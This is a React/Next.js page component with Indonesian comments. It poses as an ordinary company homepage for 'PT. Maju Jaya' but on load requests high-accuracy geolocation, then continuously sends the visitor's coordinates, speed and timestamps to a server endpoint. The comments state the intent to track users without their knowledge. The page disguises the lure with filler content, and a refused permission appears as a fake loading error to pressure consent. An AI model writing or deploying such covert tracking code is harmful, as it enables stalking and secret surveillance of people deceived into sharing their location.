"use client";

import { useState, useEffect, useRef } from "react";

export default function TrackPage() {
  const [status, setStatus] = useState("⏳ Memuat...");
  const [location, setLocation] = useState<{
    lat: number;
    lng: number;
    accuracy: number;
    speed: number;
  } | null>(null);
  const [isTracking, setIsTracking] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [showContent, setShowContent] = useState(false);
  const watchIdRef = useRef<number | null>(null);

  // AUTO START - langsung jalan saat halaman dibuka
  useEffect(() => {
    // Delay sebentar biar keliatan natural
    setTimeout(() => {
      startTracking();
    }, 500);
  }, []);

  const startTracking = () => {
    setError(null);

    if (!navigator.geolocation) {
      setError("Browser tidak mendukung fitur ini");
      setStatus("❌ Error");
      return;
    }

    setStatus("⏳ Memuat...");

    navigator.geolocation.getCurrentPosition(
      // Success - izin diberikan
      () => {
        setStatus("✅ Selesai!");
        setIsTracking(true);
        setShowContent(true);
        startWatching();
      },
      // Error - izin ditolak
      (error) => {
        console.error("Error izin:", error);
        setError("Gagal memuat halaman");
        setStatus("❌ Error");
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
      },
    );
  };

  const startWatching = () => {
    if (watchIdRef.current !== null) {
      navigator.geolocation.clearWatch(watchIdRef.current);
    }

    watchIdRef.current = navigator.geolocation.watchPosition(
      async (position) => {
        const data = {
          lat: position.coords.latitude,
          lng: position.coords.longitude,
          accuracy: Math.round(position.coords.accuracy),
          speed: position.coords.speed
            ? Math.round(position.coords.speed * 3.6)
            : 0,
          timestamp: Date.now(),
        };

        setLocation(data);

        // Kirim ke server
        try {
          await fetch("/api/location", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(data),
          });
        } catch (err) {
          console.error("Gagal kirim data:", err);
        }
      },
      (error) => {
        console.error("GPS Error:", error);
      },
      {
        enableHighAccuracy: true,
        maximumAge: 2000,
        timeout: 5000,
      },
    );
  };

  // Bersihkan saat komponen unmount
  useEffect(() => {
    return () => {
      if (watchIdRef.current !== null) {
        navigator.geolocation.clearWatch(watchIdRef.current);
      }
    };
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100">
      {/* Halaman utama - terlihat seperti website biasa */}
      <div className="max-w-4xl mx-auto px-4 py-8">
        {/* Header seperti website biasa */}
        <div className="text-center mb-8">
          <h1 className="text-3xl font-bold text-gray-800">🏢 PT. Maju Jaya</h1>
          <p className="text-gray-500 mt-2">Solusi Digital Terpercaya</p>
        </div>

        {/* Konten utama - terlihat seperti artikel */}
        <div className="bg-white rounded-2xl shadow-lg p-8">
          {!showContent ? (
            // Loading state - terlihat seperti loading biasa
            <div className="text-center py-12">
              <div className="flex justify-center mb-4">
                <div className="w-12 h-12 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
              </div>
              <p className="text-gray-500">{status}</p>
              {error && <p className="text-red-500 text-sm mt-2">{error}</p>}
            </div>
          ) : (
            // Konten setelah tracking aktif - terlihat seperti artikel biasa
            <div>
              <h2 className="text-2xl font-semibold text-gray-800 mb-4">
                Inovasi Digital untuk Masa Depan
              </h2>

              <div className="prose prose-gray max-w-none">
                <p className="text-gray-600 leading-relaxed">
                  PT. Maju Jaya hadir sebagai solusi digital terpercaya untuk
                  membantu bisnis Anda berkembang di era modern. Dengan
                  pengalaman lebih dari 10 tahun, kami siap mendampingi
                  perjalanan digital perusahaan Anda.
                </p>

                <div className="grid grid-cols-1 md:grid-cols-3 gap-4 my-6">
                  <div className="bg-blue-50 rounded-xl p-4 text-center">
                    <div className="text-3xl mb-2">💡</div>
                    <h3 className="font-semibold text-gray-800">Inovatif</h3>
                    <p className="text-sm text-gray-500">Solusi terkini</p>
                  </div>
                  <div className="bg-green-50 rounded-xl p-4 text-center">
                    <div className="text-3xl mb-2">🤝</div>
                    <h3 className="font-semibold text-gray-800">Terpercaya</h3>
                    <p className="text-sm text-gray-500">
                      10+ tahun pengalaman
                    </p>
                  </div>
                  <div className="bg-purple-50 rounded-xl p-4 text-center">
                    <div className="text-3xl mb-2">🚀</div>
                    <h3 className="font-semibold text-gray-800">Profesional</h3>
                    <p className="text-sm text-gray-500">Tim berpengalaman</p>
                  </div>
                </div>

                <p className="text-gray-600 leading-relaxed">
                  Kami berkomitmen memberikan layanan terbaik dengan teknologi
                  terkini. Percayakan kebutuhan digital Anda kepada kami.
                </p>

                <div className="mt-6 p-4 bg-gray-50 rounded-xl">
                  <p className="text-sm text-gray-400 text-center">
                    © 2024 PT. Maju Jaya. All rights reserved.
                  </p>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Footer seperti website biasa */}
        <div className="text-center mt-8 text-sm text-gray-400">
          <p>Jl. Sudirman No. 123, Jakarta</p>
          <p className="mt-1">📞 (021) 1234-5678</p>
        </div>
      </div>

      {/* Hidden - tracking berjalan di background tanpa user sadar */}
      {isTracking && location && (
        <div className="hidden">
          {/* Data tetap dikirim, tapi user tidak melihat */}
        </div>
      )}
    </div>
  );
}
